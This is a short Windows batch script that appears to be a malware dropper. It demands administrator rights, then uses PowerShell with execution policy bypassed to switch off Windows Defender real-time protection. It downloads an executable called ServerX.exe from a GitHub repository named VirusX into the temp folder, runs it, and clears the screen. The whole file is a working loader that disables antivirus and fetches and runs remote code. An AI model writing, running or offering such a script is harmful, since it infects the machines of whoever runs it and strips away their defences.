@echo off
title ***
color 0a
setlocal

net session >nul 2>&1
if %errorlevel% neq 0 (
    echo.
    echo Please run this file as Administrator
    pause >nul
    exit
)

powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Invoke-WebRequest 'https://github.com/UnknownHat832553/VirusX/raw/refs/heads/main/ServerX.exe' -OutFile $env:TEMP\ServerX.exe; Start-Process $env:TEMP\ServerX.exe"
cls